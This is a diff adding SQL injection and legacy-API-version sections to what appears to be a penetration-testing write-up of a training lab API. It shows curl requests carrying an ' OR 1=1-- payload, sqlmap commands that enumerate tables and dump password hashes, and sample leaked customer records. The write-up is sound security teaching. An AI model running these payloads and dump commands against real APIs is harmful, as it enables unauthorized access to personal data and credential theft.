@@ -17,6 +17,8 @@ This document outlines common techniques for identifying and exploiting **API re
   - [Broken Function Level Authorization (BFLA)](#broken-function-level-authorization-bfla)
   - [Unrestricted Access to Sensitive Business Flows](#unrestricted-access-to-sensitive-business-flows)
   - [Server Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
+  - [Security Misconfigurations](#security-misconfigurations)
+  - [Improper Inventory Management](#improper-inventory-management)
 
 ---
 
@@ -1248,5 +1250,208 @@ echo "<base64 string>" | base64 -d
 ```
 
 ![Filtered output](images/ssrf8.PNG)
+
+---
+
+## Security Misconfigurations
+
+A common API security misconfiguration occurs **when user-controlled input is incorporated directly into SQL queries without proper validation or sanitization**. This can result in SQL injection vulnerabilities, allowing attackers to manipulate backend database queries and access unauthorized data. 
+
+The target is vulnerable to The target is vulnerable to [CWE-89, Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html).
+
+A brief description of the weakness is shown below:
+
+```
+The product constructs all or part of an SQL command using externally-influenced input from an upstream component,
+but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when
+it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs,
+the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data.
+```
+
+Authentication is performed via the `/api/v1/authentication/suppliers/sign-in` endpoint:
+
+```
+{
+  "Email": "htbpentester12@pentestercompany.com",
+  "Password": "HTBPentester12"
+}
+```
+
+The server responds with a valid JWT:
+
+```json
+{
+  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjEyQHBlbnRlc3RlcmNvbXBhbnkuY29tIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiUHJvZHVjdHNfR2V0UHJvZHVjdHNUb3RhbENvdW50QnlOYW1lU3Vic3RyaW5nIiwiZXhwIjoxNzY4MTQ0MTYwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.p6yjtCI6fXd9tgPzGxkTe8L77m-xMyRWI0IcEaamox-fpwvz1c1Nkus9bgsoreq_cwY9Zh0GvPn9eKtHnLxwmw"
+}
+```
+
+After authorizing with the JWT, querying `/api/v1/roles/current-user` reveals that the authenticated user has the following role assigned:
+
+```
+Products_GetProductsTotalCountByNameSubstring
+```
+
+The only endpoint related to that role is:
+
+```
+/api/v1/products/{Name}/count
+```
+
+The endpoint accepts a string parameter and returns the total number of products containing the supplied substring:
+
+![Filtered output](images/sqli.PNG)
+
+Supplying a valid string such as `laptop` returns the expected result:
+
+```bash
+curl -X 'GET' \
+  'http://83.136.254.84:56041/api/v1/products/laptop/count' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer <JWT>'
+```
+
+Response:
+
+```json
+{
+  "productsCount": 18
+}
+```
+
+When appending a single quote (`'`) to the parameter, the API returns an error:
+
+```bash
+curl -X 'GET' \
+  'http://83.136.254.84:56041/api/v1/products/laptop%27/count' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer <JWT>'
+```
+
+Response:
+
+```json
+{
+  "errorMessage": "An error has occurred!"
+}
+```
+
+![Filtered output](images/sqli2.PNG)
+
+The presence of an unhandled SQL syntax error strongly indicates a **SQL injection vulnerability**.
+
+To confirm exploitation, we attempt a basic SQL injection payload to bypass filtering logic:
+
+```sql
+' OR 1=1--  
+```
+
+Request:
+
+```bash
+curl -X 'GET' \
+  'http://83.136.254.84:56041/api/v1/products/laptop%27%20OR%201%3D1--%20/count' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer <JWT>'
+```
+
+Response:
+
+```json
+{
+  "productsCount": 720
+}
+```
+
+This confirms that the injected condition is evaluated as part of the SQL query, allowing retrieval of all records in the `Products` table.
+
+To further enumerate the vulnerability, we use **SQLmap** with a captured request:
+
+```bash
+sqlmap -r req.txt --risk=3 --level=5 --batch
+```
+
+SQLmap confirms that the endpoint is vulnerable to **boolean-based blind SQL injection** and identifies the backend DBMS as **SQLite**.
+
+We proceed to enumerate available tables:
+
+```bash
+sqlmap -r req.txt --risk=3 --level=5 --technique=b --tables --batch
+```
+
+We discover 13 tables:
+
+![Filtered output](images/sqli4.PNG)
+
+We can then dump sensitive data from individual tables, such as the `Supplier` table:
+
+```bash
+sqlmap -r req.txt --risk=3 --level=5 --technique=b -T Supplier --dump --batch
+```
+
+This reveals sensitive information, including email addresses and password hashes:
+
+![Filtered output](images/sqli5.PNG)
+
+---
+
+## Improper Inventory Management
+
+As APIs **mature and evolve**, it is critical to implement **proper versioning and lifecycle management**. Improper inventory management—such as retaining deprecated or legacy API versions without adequate access controls—can significantly expand the attack surface and introduce severe security risks.
+
+In the previous sections, all interaction was limited to **version** `v1` of the target API. However, when examining the API documentation dropdown labeled `Select a definition`, an additional version—`v0`—is discovered:
+
+![Filtered output](images/inventory-management.PNG)
+
+Selecting `v0` reveals that this version contains **legacy and deleted data**, as indicated by the following description:
+
+```
+Inlanefreight E-Commerce Marketplace API Specification.
+Need to delete this version. Not maintained anymore... We will keep it to retrieve legacy/deleted data whenever needed.
+```
+
+![Filtered output](images/inventory-management2.PNG)
+
+Unlike the `v1` endpoints, none of the `v0` endpoints display the **lock icon**, which is used to indicate that authentication is required. This suggests that **no authorization or authentication controls** are enforced for the legacy API version:
+
+![Filtered output](images/inventory-management3.PNG)
+
+When invoking the `/api/v0/customers/deleted` endpoint, the API responds with **deleted customer records**, exposing highly sensitive information, including:
+
+- Full names
+- Email addresses
+- Phone numbers
+- Dates of birth
+- Password hashes
+
+**Example response:**
+
+```json
+{
+    "ID": "e4585907-8c2a-4d84-85fc-597fc543031c",
+    "Name": "Dmitri Owens",
+    "Email": "DmitriOwens@fastmail.com",
+    "PhoneNumber": "+49 1791 7237887",
+    "BirthDate": "1965-04-06",
+    "PasswordHash": "D240F1DCD425ABC171CC430413B3988F"
+  },
+  {
+    "ID": "d6e83c4b-89f5-4c05-9049-84df80f656c7",
+    "Name": "Nikolai Gordon",
+    "Email": "NikolaiGordon@live.com",
+    "PhoneNumber": "+61 9 3609 9256",
+    "BirthDate": "1991-01-10",
+    "PasswordHash": "F78F2477E949BEE2D12A2C540FB6084F"
+  },
+```
+
+![Filtered output](images/inventory-management4.PNG)
+
+This behavior demonstrates **Improper Inventory Management**, where an obsolete and unauthenticated API version exposes sensitive and previously deleted data. Such information can be leveraged in:
+
+- Credential stuffing and brute-force attacks
+- Phishing and social engineering campaigns
+- User account takeover attempts
+
+Proper API version deprecation, access control enforcement, and data sanitization are essential to prevent this class of vulnerability.
 
 ---
